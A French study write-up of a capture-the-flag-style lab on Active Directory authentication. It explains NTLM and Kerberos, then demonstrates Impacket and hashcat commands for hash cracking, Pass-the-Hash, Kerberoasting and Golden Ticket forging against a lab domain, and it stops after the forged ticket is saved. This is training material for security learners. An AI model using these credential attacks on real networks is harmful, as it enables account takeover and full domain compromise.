# Task 2 — Authentication in AD

## 🔐 Qu'est-ce que l'authentification ?

Avant d'explorer les outils et techniques, il est essentiel de comprendre ce que signifie réellement **l'authentification** dans un environnement Active Directory (AD).

> **Authentification** = le processus qui permet de prouver son identité.
> Question posée : *« Es-tu bien celui/celle que tu prétends être ? »*

---

## 🧾 Matériel d'authentification (Authentication Material)

Lors de l'authentification, on fournit un élément (credential) qui prouve son identité. Dans un environnement AD, cela peut prendre plusieurs formes :

| Méthode | Description |
|---|---|
| **Nom d'utilisateur + mot de passe** | La méthode la plus courante — on fournit *quelque chose que l'on connaît*. |
| **Certificats** | Certificat cryptographique délivré par une autorité de certification (CA) de confiance. Utilisé notamment pour l'authentification machine ou les cartes à puce (smart card logon). |
| **Hashes** | Non destinés à être utilisés directement, mais peuvent être exploités dans certaines attaques (ex. Pass-the-Hash) — détaillé dans les tasks suivantes. |

➡️ Quel que soit le moyen utilisé, l'objectif reste le même : **prouver au domaine que l'on est bien qui l'on prétend être**.

---

## ⚖️ Authentification vs Autorisation

Une confusion fréquente concerne la différence entre ces deux notions, qui sont **deux processus distincts** :

- **Authentification** → prouve l'identité
  *« Tu es John. »*
- **Autorisation** → détermine les droits d'accès
  *« John a accès au partage Finance. »*

### Ordre logique
1. **Authentification** : le domaine vérifie les identifiants fournis lors de la connexion à une machine jointe au domaine.
2. **Autorisation** : une fois authentifié, le système vérifie (via les appartenances aux groupes, les ACL, etc.) ce que l'utilisateur est **réellement autorisé à faire** sur le réseau.

> 🔑 L'authentification précède toujours l'autorisation : il faut d'abord savoir *qui* accède, avant de déterminer *à quoi* il peut accéder.

---

## 🛡️ Protocoles d'authentification AD

Deux protocoles principaux gèrent la vérification d'identité dans AD :

### 1. NetNTLM (NTLM)
- Protocole d'authentification de type **challenge-response**.
- Existe depuis les débuts de Windows NT.

### 2. Kerberos
- Protocole d'authentification basé sur des **tickets**.
- Devenu le protocole **par défaut** depuis Windows 2000.
- Reste aujourd'hui la **méthode privilégiée**.

### Cas particulier : authentification par certificat (smart card / TLS-SSL)
Même lorsqu'un certificat est utilisé pour prouver l'identité (ex. carte à puce), le résultat final est **l'émission d'un ticket Kerberos**, utilisé ensuite pour l'authentification aux ressources du domaine.

> Le certificat prouve l'identité → **Kerberos** gère ensuite l'authentification de session.

---

## 🌐 Autres protocoles rencontrés (LDAP, WebDAV, SMB…)

Ces protocoles ne sont **pas** des protocoles d'authentification à proprement parler, mais des **protocoles d'accès aux services ou à l'annuaire**.

- Ils s'appuient sur **NTLM** ou **Kerberos** pour effectuer l'authentification réelle.
- Exemple : l'authentification à un service **LDAP** ou l'accès à un partage **SMB** est en réalité gérée en arrière-plan par NTLM ou Kerberos.

---

# Task 3 — NetNTLM Authentication

Maintenant que la notion d'authentification est claire, penchons-nous sur le premier des deux protocoles fondamentaux d'authentification AD : **NTLM**.

---

## 🔎 Qu'est-ce que NTLM ?

**NetNTLM** (souvent appelé simplement **NTLM**) est un protocole d'authentification de type **challenge-response**, présent depuis les débuts de Windows NT.

- Il a été **largement remplacé par Kerberos** comme protocole par défaut dans les environnements Windows modernes.
- Il reste néanmoins **très utilisé** :
  - dans les systèmes legacy,
  - dans les environnements de type **workgroup**,
  - comme **méthode de repli (fallback)** lorsque Kerberos n'est pas disponible.

### Versions de NTLM
| Version | Description |
|---|---|
| **NTLMv1** | Version originale, aujourd'hui considérée comme **fortement non sécurisée**. |
| **NTLMv2** | Version améliorée, cryptographie plus robuste, mais **toujours vulnérable** à diverses attaques. |

---

## ⚙️ Fonctionnement de l'authentification NTLM

🔑 **Point clé** : avec NTLM, le client s'authentifie **auprès du service** qu'il souhaite atteindre, et c'est ce service qui vérifie ensuite l'identité de l'utilisateur auprès du contrôleur de domaine (DC).

> ⚠️ Différence avec Kerberos : avec Kerberos, l'utilisateur s'authentifie **d'abord auprès du DC**, puis reçoit un ticket à présenter aux services.

### Étapes du processus d'authentification NTLM
<img width="1051" height="605" alt="image" src="https://github.com/user-attachments/assets/50649b43-1934-44fe-b55a-8276687312ab" />


1. Le **client** envoie une requête d'accès à un service, en fournissant son nom d'utilisateur.
2. Le **serveur** génère un nombre aléatoire de 16 octets appelé **challenge** (ou *nonce*), et l'envoie au client.
3. Le **client** chiffre ce challenge à l'aide du **hash NT** de son mot de passe, puis renvoie la réponse au serveur.
4. Le **serveur** transmet le nom d'utilisateur, le challenge original et la réponse du client au **contrôleur de domaine**.
5. Le **DC** récupère le hash NT de l'utilisateur dans sa base et l'utilise pour chiffrer le même challenge.
6. Le **DC** compare son résultat à la réponse envoyée par le client → si les deux correspondent, l'authentification réussit.
7. Le **serveur** reçoit le résultat du DC et **autorise ou refuse** l'accès en conséquence.

> 💡 Le mot de passe réel **n'est jamais envoyé sur le réseau** — seule la réponse chiffrée au challenge circule. C'est ce qu'on appelle parfois une **preuve à divulgation nulle de connaissance** (*zero-knowledge proof*) : l'utilisateur prouve qu'il connaît le mot de passe sans jamais le révéler directement.

---

## ✅ Avantages de NTLM

| Avantage | Détail |
|---|---|
| **Simplicité** | Facile à mettre en œuvre, ne nécessite pas d'infrastructure supplémentaire (ex. Key Distribution Center / KDC). |
| **Pas de synchronisation d'horloge requise** | Contrairement à Kerberos, ne dépend pas d'horloges synchronisées entre systèmes. |
| **Compatibilité de repli (fallback)** | Sert de solution fiable quand l'authentification Kerberos échoue. |
| **Support des workgroups** | Utilisable dans des environnements hors domaine, là où Kerberos n'est pas disponible. |

---

## ⚠️ Inconvénients de NTLM

| Faiblesse | Détail |
|---|---|
| **Pas d'authentification mutuelle** | Le client ne peut pas vérifier l'identité du serveur → vulnérable aux attaques **Man-in-the-Middle**. |
| **Cryptographie faible** | NTLMv1 utilise le chiffrement **DES** et des hashes **non salés**, cassables rapidement avec le matériel moderne. Même NTLMv2 stocke des hashes non salés en mémoire. |
| **Vulnérable aux attaques de relais (relay attacks)** | Un attaquant peut intercepter et relayer une authentification NTLM pour accéder à d'autres services sans autorisation. |
| **Attaques Pass-the-Hash** | Le hash NT étant utilisé directement dans le processus, un attaquant en possession du hash peut s'authentifier **sans connaître le mot de passe réel**. |
| **Performances plus lentes** | Chaque requête d'authentification nécessite une communication avec le DC, ce qui peut ralentir l'authentification dans les grands environnements. |

---

## 📌 Quand NTLM est-il utilisé ?

Même dans les environnements AD modernes où Kerberos est le protocole par défaut, NTLM reste utilisé dans les cas suivants :

- Le client **ne peut pas joindre un contrôleur de domaine** pour obtenir un ticket Kerberos.
- Accès à une ressource **via son adresse IP** plutôt que son nom d'hôte (Kerberos nécessite un **SPN – Service Principal Name**, qui repose sur la résolution DNS).
- Le service cible **n'a pas de SPN enregistré** dans Active Directory.
- Authentification vers des systèmes **non joints au domaine**.
- Des **applications legacy** nécessitent explicitement NTLM.

---

## 🧪 Authentification NTLM avec Impacket

Mise en pratique de l'authentification NTLM à l'aide d'un outil **Impacket** — une collection de scripts Python implémentant divers protocoles réseau utilisés dans les environnements AD.

> 📂 Disponible sur l'AttackBox dans : `/opt/impacket/examples/`

### Connexion à un partage via `smbclient.py`

```bash
root@tryhackme:~$ smbclient.py thm.loc/claire:'Password123!'@192.168.11.51
```

Une fois connecté :
- `shares` → liste les partages disponibles.
- `use SHARE1` → se connecte au partage `SHARE1`.
- Le flag peut ensuite être récupéré depuis le partage.

### Ce qu'il s'est passé en coulisses

1. Le client a envoyé son **nom d'utilisateur** à la cible.
2. La cible a répondu avec un **challenge**.
3. Le client a **chiffré le challenge** avec le hash NT de son mot de passe, puis a renvoyé la réponse.
4. La cible a **transmis les identifiants** au contrôleur de domaine pour vérification.
5. Après **vérification réussie**, l'accès a été accordé.

➡️ Une authentification **NTLM** complète vient d'être réalisée.

---
<img width="915" height="738" alt="image" src="https://github.com/user-attachments/assets/96b54f90-811b-44da-8617-c9e9f3d44e25" />

<img width="791" height="355" alt="image" src="https://github.com/user-attachments/assets/dc780e98-e7c7-4657-b081-d7a48ebd00b4" />

# Task 4 — Kerberos Authentication

Examinons maintenant **Kerberos**, le protocole d'authentification par défaut dans les environnements AD modernes. Contrairement à NTLM, Kerberos utilise un système **basé sur des tickets** et authentifie via un tiers de confiance : le **Key Distribution Center (KDC)**.

---

## 🔎 Qu'est-ce que Kerberos ?

Kerberos est un protocole d'authentification réseau développé par le **MIT** et adopté par Microsoft comme méthode d'authentification par défaut à partir de **Windows 2000**.

Le protocole tire son nom de **Cerbère** (Kerberos), le chien à trois têtes de la mythologie grecque gardant les portes des enfers — un nom approprié pour un protocole conçu pour garder l'accès aux ressources réseau.

### Différence fondamentale avec NTLM

Une différence critique entre Kerberos et NTLM concerne **l'endroit où se déroule l'authentification** :

- Avec **NTLM** : on s'authentifie **auprès du service** que l'on souhaite atteindre, et c'est ce service qui vérifie ensuite l'identité auprès du contrôleur de domaine.
- Avec **Kerberos** : c'est l'inverse. On s'authentifie **d'abord auprès du contrôleur de domaine**, et l'on reçoit des **tickets** que l'on présente ensuite aux services pour prouver son identité.

---

## 🧩 Composants clés de Kerberos

Avant de détailler le flux d'authentification, voici les composants essentiels à connaître :

| Composant | Description |
|---|---|
| **Key Distribution Center (KDC)** | Service tournant sur le contrôleur de domaine, gérant toutes les demandes de tickets. Il se compose de l'**Authentication Service (AS)** et du **Ticket Granting Service (TGS)**. |
| **Authentication Service (AS)** | Composant du KDC qui vérifie l'identité de l'utilisateur et délivre le **Ticket Granting Ticket (TGT)** initial. |
| **Ticket Granting Service (TGS)** | Composant du KDC qui délivre des tickets de service aux utilisateurs présentant un TGT valide. |
| **Ticket Granting Ticket (TGT)** | Le « ticket principal » initial délivré après une authentification réussie. Il est utilisé pour demander l'accès à des services spécifiques. |
| **Service Ticket (ST)** | Ticket accordant l'accès à un service spécifique. Obtenu en présentant un TGT au TGS. |
| **Service Principal Name (SPN)** | Identifiant unique d'une instance de service, utilisé par Kerberos pour associer un service à un compte spécifique. |
| **Compte KRBTGT** | Compte spécial dans AD dont le hash du mot de passe sert à chiffrer tous les TGT. La compromission de ce compte permet de forger des **Golden Tickets**. |

---

## ⚙️ Fonctionnement de l'authentification Kerberos

Le processus d'authentification Kerberos implique plusieurs échanges entre le client, le KDC, et le service cible. Au total, il comprend **5 étapes et 8 processus**, détaillés ci-dessous :

### Étape 1 : Authentication Service Request (AS-REQ)

1. L'utilisateur saisit ses identifiants sur la machine cliente.
2. Le client envoie une **Authentication Service Request (AS-REQ)** au KDC, contenant le nom d'utilisateur et un horodatage (*timestamp*) chiffré avec le hash du mot de passe de l'utilisateur. C'est ce que l'on appelle la **pré-authentification**.

### Étape 2 : Authentication Service Response (AS-REP)

3. Le KDC vérifie l'identité de l'utilisateur en déchiffrant le timestamp à l'aide du hash du mot de passe de l'utilisateur stocké dans AD.
4. En cas de succès, le KDC répond avec un **AS-REP** contenant :
   - Une **clé de session** chiffrée avec le hash du mot de passe de l'utilisateur.
   - Un **TGT** chiffré avec le hash du mot de passe du compte **KRBTGT**.

<img width="1047" height="416" alt="image" src="https://github.com/user-attachments/assets/370d2611-9267-4c3b-8747-72e7c51dfbaf" />


Le client peut déchiffrer la clé de session, mais **ne peut ni déchiffrer ni modifier le TGT** — seul le KDC le peut.

### Étape 3 : Ticket Granting Service Request (TGS-REQ)

5. Lorsque l'utilisateur souhaite accéder à un service, le client envoie une **TGS-REQ** au KDC contenant :
   - Le TGT reçu précédemment.
   - Le **SPN** du service auquel il souhaite accéder.
   - Un **authenticator** (nom d'utilisateur + timestamp) chiffré avec la clé de session.

### Étape 4 : Ticket Granting Service Response (TGS-REP)

6. Le KDC déchiffre le TGT à l'aide du hash KRBTGT, valide la requête, et répond avec :
   - Un **Service Ticket (ST)** chiffré avec le hash du mot de passe du service cible.
   - Une **clé de session de service** chiffrée avec la clé de session originale.
<img width="1049" height="486" alt="image" src="https://github.com/user-attachments/assets/fd70475d-05ba-40cc-b739-e42996482d79" />


### Étape 5 : Application Request (AP-REQ)

7. Le client présente le **Service Ticket** au service cible.
8. Le service déchiffre le ticket à l'aide de son propre hash de mot de passe, valide l'identité de l'utilisateur, et accorde l'accès.
<img width="1029" height="362" alt="image" src="https://github.com/user-attachments/assets/bfef6ae0-07d6-4662-92b7-2f777849bf8a" />

---

## ✅ Avantages de Kerberos

Kerberos offre des avantages significatifs par rapport à NTLM :

| Avantage | Détail |
|---|---|
| **Authentification mutuelle** | Le client et le serveur vérifient tous deux leur identité respective, protégeant contre les attaques de type *man-in-the-middle*. |
| **Aucune transmission de mot de passe** | Les mots de passe et les hashes ne sont jamais envoyés sur le réseau — seuls des tickets chiffrés et des clés de session circulent. |
| **Single Sign-On (SSO)** | Une fois qu'un utilisateur obtient un TGT, il peut accéder à plusieurs services sans ressaisir ses identifiants. |
| **Support de la délégation** | Kerberos permet à des services d'agir au nom des utilisateurs pour accéder à d'autres ressources. |
| **Meilleures performances** | Le KDC n'est contacté que lors de l'authentification initiale et lors des demandes de nouveaux tickets de service. Les services valident les tickets localement, sans contacter le DC à chaque requête. |
| **Tickets à durée limitée** | Les tickets ont une durée de vie configurable (généralement **10 heures** pour les TGT), limitant la fenêtre d'opportunité pour les attaquants. |

---

## ⚠️ Inconvénients de Kerberos

Malgré ses améliorations, Kerberos comporte ses propres faiblesses :

| Faiblesse | Détail |
|---|---|
| **Synchronisation d'horloge requise** | Kerberos exige que les horloges soient synchronisées à **5 minutes près**. Un écart trop important provoque des échecs d'authentification. |
| **Point unique de défaillance (SPOF)** | Le KDC est critique : s'il est indisponible, l'authentification Kerberos échoue entièrement (bien que NTLM puisse servir de repli). |
| **Vulnérable aux attaques sur les tickets** | Des tickets volés peuvent être utilisés pour usurper l'identité d'utilisateurs (**Pass-the-Ticket**). Un hash KRBTGT compromis permet de forger des **Golden Tickets**. |
| **Kerberoasting** | Les tickets de service sont chiffrés avec le hash du mot de passe du compte de service, lequel peut être demandé par **n'importe quel utilisateur authentifié** et cassé hors ligne (*offline cracking*). |
| **Complexité** | Kerberos nécessite un enregistrement SPN correct, une configuration DNS adéquate, et une synchronisation temporelle — le rendant plus complexe à déployer et à dépanner. |

---

## 🗂️ Fichiers de cache d'identifiants (ccache)

Sur les systèmes Linux, Kerberos stocke les tickets dans des fichiers de cache d'identifiants, communément appelés **fichiers ccache**. Ces fichiers contiennent le TGT de l'utilisateur ainsi que tous les tickets de service obtenus durant sa session.

### Points clés sur les fichiers ccache

- **Emplacement par défaut** : `/tmp/krb5cc_%{uid}` (par exemple, `/tmp/krb5cc_1000` pour l'UID 1000).
- La variable d'environnement **`KRB5CCNAME`** indique quel fichier ccache utiliser.
- La commande **`klist`** affiche les tickets stockés dans le cache courant.
- Des outils comme **Impacket** utilisent les fichiers ccache pour s'authentifier sans mot de passe.

> ⚠️ Ceci est important pour les attaquants : si l'on parvient à obtenir le fichier ccache d'un utilisateur, il est possible de s'authentifier en tant que cet utilisateur **sans connaître son mot de passe** — une attaque connue sous le nom de **Pass-the-Ticket** ou **Pass-the-ccache**.

---

## 🧪 Authentification Kerberos avec Impacket

Mise en pratique de l'authentification Kerberos avec Impacket. Nous allons d'abord obtenir un **TGT** et le stocker dans un fichier ccache, puis utiliser ce ticket pour nous authentifier auprès d'un service.

Étant donné que Kerberos fonctionne via **DNS**, la toute première étape consiste à ajouter en dur le nom d'hôte **SERVER1** :

### Ajouter SERVER1 à `/etc/hosts`

```bash
root@tryhackme:~$ echo 192.168.11.51 SERVER1.thm.loc >> /etc/hosts
```

### Obtenir un TGT avec `getTGT.py`

En utilisant le même terminal que dans la task précédente, on utilise `getTGT.py` d'Impacket pour demander un TGT :

```bash
root@tryhackme:~$ getTGT.py thm.loc/mary:'SuperLongForKerberos123!' -dc-ip 192.168.11.100
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Saving ticket in mary.ccache
```

Ceci crée un fichier ccache nommé `mary.ccache` dans le répertoire courant.

### Définir la variable d'environnement `KRB5CCNAME`

Pour utiliser ce ticket lors de l'authentification, il faut définir la variable d'environnement `KRB5CCNAME` afin qu'elle pointe vers notre fichier ccache :

```bash
root@tryhackme:$ export KRB5CCNAME=mary.ccache
```

### Se connecter à un partage SMB avec authentification Kerberos

La variable d'environnement étant définie, l'authentification Kerberos peut désormais être utilisée avec d'autres outils Impacket. Connexion à un partage SMB via `smbclient.py` avec authentification Kerberos :

```bash
root@tryhackme:$ smbclient.py thm.loc/mary@SERVER1.thm.loc -k -no-pass -dc-ip 192.168.11.100
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

Type help for list of commands
#
```

- Le flag **`-k`** indique à l'outil d'utiliser l'authentification Kerberos.
- Le flag **`-no-pass`** indique que l'authentification se fait via un ticket plutôt qu'un mot de passe.
- Comme une demande de TGS sera adressée au contrôleur de domaine mais que le DNS ne fonctionne pas, le flag **`-dc-ip`** est utilisé pour indiquer où trouver le KDC.

> 📌 **Note** : lors de l'utilisation de Kerberos, il faut impérativement utiliser le **nom d'hôte** (et non l'adresse IP), car Kerberos repose sur des **SPN**, eux-mêmes liés à des noms DNS.

### Ce qu'il s'est passé en coulisses

1. Le client a utilisé le **TGT** issu du fichier ccache pour demander un **Service Ticket** au KDC.
2. Le **KDC** a délivré un Service Ticket pour le service SMB.
3. Le client a **présenté le Service Ticket** à l'hôte cible.
4. L'hôte cible a **validé le ticket** et accordé l'accès.

➡️ Une authentification **Kerberos** complète vient d'être réalisée.

---

# Task 5 — Weaknesses in AD Authentication

Maintenant que le fonctionnement de **NTLM** et de **Kerberos** est clair, il est essentiel de comprendre **pourquoi** cette connaissance compte d'un point de vue sécurité. Les deux protocoles, bien que fonctionnels, présentent des **faiblesses importantes** exploitables par des attaquants pour obtenir un accès non autorisé aux systèmes et aux données.

> ⚠️ Bien qu'ayant des décennies d'existence, ces vulnérabilités restent **très présentes** dans les environnements AD modernes et sont **activement exploitées** dans des attaques réelles.

---

## 🧨 Faiblesses courantes de l'authentification AD

Ces vulnérabilités proviennent à la fois de **limitations de conception des protocoles** et de **mauvaises configurations courantes**.

### 🔴 Faiblesses spécifiques à NTLM

| Faiblesse | Détail |
|---|---|
| **Cryptographie faible** | NTLM utilise l'algorithme de hachage obsolète **MD4**, sans sel (*salt*), rendant les hashes vulnérables aux **rainbow tables** et au brute-force rapide via GPU. |
| **Pass-the-Hash (PtH)** | Le hash étant utilisé directement dans le mécanisme challenge-response, un attaquant possédant le hash NTLM d'un utilisateur peut s'authentifier **sans jamais connaître le mot de passe en clair**. |
| **Attaques de relais NTLM (Relay)** | L'absence d'authentification mutuelle permet d'**intercepter et relayer** une tentative d'authentification NTLM vers d'autres services, sans avoir besoin de casser les identifiants. |
| **Attaques de downgrade** | Un attaquant peut forcer un système à **basculer de Kerberos vers NTLM**, plus faible, l'exposant ainsi aux attaques spécifiques à NTLM. |
| **Pas d'authentification mutuelle** | NTLM ne permet pas de vérifier l'identité du serveur, facilitant grandement les attaques **Man-in-the-Middle**. |

### 🟠 Faiblesses spécifiques à Kerberos

| Faiblesse | Détail |
|---|---|
| **Kerberoasting** | Tout utilisateur authentifié du domaine peut demander des **tickets de service** pour des comptes disposant d'un SPN enregistré. Ces tickets, chiffrés avec le hash du compte de service, peuvent être **cassés hors ligne**, révélant souvent des mots de passe de service faibles. |
| **AS-REP Roasting** | Les utilisateurs ayant la **pré-authentification Kerberos désactivée** peuvent voir leur hash de mot de passe extrait et cassé hors ligne, **sans authentification préalable** au domaine. |
| **Pass-the-Ticket (PtT)** | Des tickets Kerberos valides peuvent être extraits de la mémoire et **réutilisés** pour s'authentifier en tant que leur propriétaire, sans connaître son mot de passe. |
| **Overpass-the-Hash** | Un attaquant possédant le hash NTLM d'un utilisateur peut demander un **TGT Kerberos** en son nom, convertissant ainsi efficacement un hash NTLM en ticket Kerberos. |
| **Golden Ticket** | Si un attaquant obtient le hash du mot de passe du compte **KRBTGT**, il peut forger des TGT pour **n'importe quel utilisateur du domaine**, y compris les Domain Admins, offrant un contrôle total et persistant du domaine. |
| **Silver Ticket** | Similaire au Golden Ticket, mais forgé à partir du hash d'un **compte de service** pour créer des tickets de service ciblant une ressource spécifique, **sans contacter le KDC**. |

### 🟡 Faiblesses liées à la configuration

| Faiblesse | Détail |
|---|---|
| **Mots de passe faibles** | Malgré les contrôles techniques, les mots de passe faibles (utilisateurs et comptes de service) restent le **point d'entrée le plus courant** pour les attaques d'authentification. |
| **Password Spraying** | Un attaquant tente l'authentification avec des mots de passe courants sur **de nombreux comptes**, contournant souvent les politiques de verrouillage de compte. |
| **Délégation mal configurée** | Une mauvaise configuration de la délégation Kerberos (contrainte ou non contrainte) peut permettre **l'élévation de privilèges** et le **mouvement latéral**. |
| **Identifiants obsolètes (Stale Credentials)** | Les anciens comptes de service, comptes d'anciens employés, et comptes machine inutilisés ont souvent des mots de passe faibles ou inchangés — des **cibles faciles**. |

> 📊 Ces vulnérabilités ne sont **pas théoriques** : elles sont activement exploitées sur le terrain. Selon les renseignements sur les menaces récents, les **attaques basées sur les identifiants** représentent la majorité des compromissions AD réussies. Microsoft a même annoncé son intention de **déprécier NTLM** à terme dans les futures versions de Windows en raison de ses faiblesses de sécurité intrinsèques — une transition qui prendra toutefois plusieurs années.

---

## 🧪 Démonstrations pratiques

Cette task propose une mise en pratique de **quatre faiblesses d'authentification**. Pour chaque attaque, l'objectif est de s'authentifier au partage de fichiers utilisé dans les tasks précédentes (**SERVER1.thm.loc : 192.168.11.51**) à l'aide d'identifiants compromis différents, afin de récupérer un flag.

> 💡 Cette task sert d'**aperçu** — chaque technique sera approfondie dans des rooms dédiées plus tard dans ce module.

Les quatre attaques démontrées sont :

1. **Weak Password Hashing** — Casser des hashes NTLM pour récupérer les mots de passe en clair.
2. **Pass-the-Hash** — S'authentifier avec uniquement le hash, sans mot de passe en clair.
3. **Kerberoasting** — Extraire et casser les identifiants d'un compte de service.
4. **Golden Ticket** — Forger des tickets Kerberos pour usurper l'identité de n'importe quel utilisateur.

---

## 1️⃣ Weak Password Hashing

Une des faiblesses les plus fondamentales de l'authentification AD est l'utilisation d'un **hachage de mot de passe faible**. Les mots de passe stockés dans AD sont hachés avec l'algorithme **NTLM**. Si cela évite un stockage en clair, les hashes NTLM ont un défaut critique : ils sont calculés **sans sel (salt)**.

➡️ Des mots de passe identiques produisent donc toujours des hashes identiques, les rendant vulnérables aux attaques par **tables précalculées (rainbow tables)** et au **brute-force**.

Des outils comme **Hashcat** peuvent traiter des **milliards de hashes NTLM par seconde** grâce à l'accélération GPU. Un mot de passe faible ou courant peut être cassé en quelques secondes ou minutes.

> **Pourquoi ça fonctionne** : les hashes NTLM sont non salés et utilisent l'algorithme **MD4**, relativement rapide, ce qui les rend extrêmement rapides à casser avec du matériel moderne. Les mots de passe faibles tombent rapidement face aux attaques par dictionnaire et par règles.

### 🖥️ Démonstration pratique

Hash NTLM obtenu pour l'utilisateur `phillip` :

```
phillip:1106:aad3b435b51404eeaad3b435b51404ee:939B0058BC6DD834ABC4CC08CFEFEA69:::
```

Format standard : `username:uid:LM_hash:NTLM_hash:::`
Hash NTLM à casser : `939B0058BC6DD834ABC4CC08CFEFEA69`

**Enregistrer le hash** dans un fichier `hash.txt` (format attendu par Hashcat) :

```
939B0058BC6DD834ABC4CC08CFEFEA69
```

**Casser le hash avec Hashcat** (mode 1000 = NTLM, wordlist rockyou) :

```bash
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```

**Afficher le mot de passe cassé** :

```bash
hashcat -m 1000 hash.txt --show
```

**S'authentifier au partage** avec le mot de passe récupéré :

```bash
root@tryhackme:$ smbclient.py "thm.loc/phillip:<RECOVERED_PASSWORD>"@192.168.11.51
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

Type help for list of commands
#
```

➡️ Se connecter au partage **SHARE3** et récupérer `flag3.txt`.

---

## 2️⃣ Pass-the-Hash

Même si un mot de passe ne peut pas être cassé, le **hash lui-même** peut souvent être utilisé directement pour l'authentification. C'est l'attaque **Pass-the-Hash (PtH)**. Puisque NTLM utilise le hash directement dans son processus challenge-response, un attaquant en possession du hash **n'a pas besoin de connaître le mot de passe en clair**.

➡️ Particulièrement dangereux : même un mot de passe fort et incassable **n'offre aucune protection** contre le PtH si l'attaquant peut obtenir le hash — extrait de la mémoire via des outils comme **Mimikatz**, ou obtenu via des techniques comme le **relais NTLM**.

> **Pourquoi ça fonctionne** : le protocole NTLM utilise directement le hash dans son mécanisme challenge-response. Le mot de passe en clair n'est jamais réutilisé après le hachage initial. Posséder le hash équivaut donc, fonctionnellement, à connaître le mot de passe pour une authentification via NTLM.

### 🖥️ Démonstration pratique

Hash NTLM obtenu pour l'utilisateur `ben` :

```
63CF41DC25C04B8FB79E44B1DEF12C10
```

Ce hash **n'a pas besoin d'être cassé**. Les outils Impacket supportent nativement le Pass-the-Hash via le paramètre `-hashes` :

```bash
root@tryhackme:$ smbclient.py thm.loc/ben@192.168.11.51 -hashes aad3b435b51404eeaad3b435b51404ee:63CF41DC25C04B8FB79E44B1DEF12C10
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

Type help for list of commands
#
```

> 📌 Format du paramètre `-hashes` : `LM_hash:NTLM_hash`. Les hashes LM étant rarement utilisés aujourd'hui, on fournit la valeur vide `aad3b435b51404eeaad3b435b51404ee`, suivie du véritable hash NTLM.

➡️ Une fois authentifié, se rendre sur le partage **SHARE4** et récupérer `flag4.txt`.

---

## 3️⃣ Kerberoasting

Le **Kerberoasting** cible les **comptes de service** dans AD. Lorsqu'un utilisateur demande l'accès à un service, il reçoit un **Service Ticket (TGS-REP)** chiffré avec le hash du mot de passe du compte de service. **Tout utilisateur authentifié** du domaine peut demander ces tickets, même pour des services auxquels il n'a pas réellement besoin d'accéder.

➡️ La partie chiffrée du ticket peut être extraite et **cassée hors ligne**. Si le compte de service a un mot de passe faible, un attaquant peut le récupérer et obtenir un accès — souvent avec des **privilèges élevés**.

> **Pourquoi ça fonctionne** : les tickets de service sont chiffrés avec le hash du compte de service et peuvent être demandés par n'importe quel utilisateur authentifié. Le chiffrement étant réalisé en **RC4** ou **AES**, les tickets peuvent faire l'objet d'un cassage hors ligne. Les comptes de service ont souvent des mots de passe faibles ou jamais changés, contrairement aux mots de passe utilisateurs régulièrement renouvelés.

### 🖥️ Démonstration pratique

**Énumérer les comptes de service avec SPN** via le compte de Claire, avec `GetUserSPNs.py` d'Impacket :

```bash
root@tryhackme:$ GetUserSPNs.py thm.loc/claire:'Password123!' -dc-ip 192.168.11.100 -request
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

ServicePrincipalName    Name         MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------  -----------  --------  --------------------------  --------------------------  ----------
http/svc_print.thm.loc  svc_printer            2026-02-08 17:13:08.795049  2026-04-30 11:14:01.157692             

$krb5tgs$23$*svc_printer$THM.LOC$thm.loc/svc_printer*$a8cee6d54955985f574fcdf1[...]
```

Cette commande affiche les comptes de service avec SPN enregistré et demande **automatiquement** leurs tickets de service, prêts pour le cassage via Hashcat.

**Enregistrer le hash** du ticket de service dans un fichier `service_ticket.txt` (format Hashcat, commençant par `$krb5tgs$23$`).

**Casser le ticket** avec Hashcat en mode **13100** (tickets Kerberos TGS-REP) :

```bash
root@tryhackme:$ hashcat -m 13100 service_ticket.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1-66-g6a419d06) starting...
```

Une fois cassé, le mot de passe du compte de service `svc_printer` est récupéré. **S'authentifier** au partage avec ce compte :

```bash
root@tryhackme:$ smbclient.py "thm.loc/svc_printer:<RECOVERED_PASSWORD>"@192.168.11.51
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

Type help for list of commands
#
```

➡️ Se rendre sur le partage **SHARE5** et récupérer `flag5.txt`.

---

## 4️⃣ Golden Ticket

La **plus puissante** des attaques d'authentification AD. Elle consiste à **forger des TGT Kerberos** à l'aide du hash du mot de passe du compte **KRBTGT**. Ce compte étant responsable de la signature de **tous** les TGT du domaine, un attaquant en possession de ce hash peut créer des tickets valides pour **n'importe quel utilisateur**, y compris les Domain Admins, sans avoir besoin de leurs véritables identifiants.

➡️ Les Golden Tickets sont extrêmement dangereux car ils offrent un **contrôle total du domaine** et restent utilisables **même après correction du vecteur de compromission initial**. Les tickets restent valides jusqu'à ce que le mot de passe KRBTGT soit **réinitialisé deux fois** (l'ancien mot de passe étant également mis en cache).

> **Pourquoi ça fonctionne** : tous les TGT Kerberos sont chiffrés et signés avec le hash du compte KRBTGT. Si un attaquant obtient ce hash, il peut forger des tickets que les contrôleurs de domaine accepteront comme légitimes. Ces tickets forgés peuvent accorder n'importe quel niveau d'accès et sont **quasiment indiscernables** de tickets légitimes.

### 🖥️ Démonstration pratique

Hash KRBTGT obtenu pour le domaine :

```
KRBTGT Hash: e9a9871b93d7b4d73c91665bd6df6e50
Domain SID: S-1-5-21-990021728-513958382-3715561918
```

**Forger un Golden Ticket** pour le Domain Administrator avec `ticketer.py` d'Impacket :

```bash
root@tryhackme:$ ticketer.py -nthash e9a9871b93d7b4d73c91665bd6df6e50 -domain-sid S-1-5-21-990021728-513958382-3715561918 -domain thm.loc Administrator
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for thm.loc/Administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncAsRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncASRepPart
[*] Saving ticket in Administrator.ccache
```

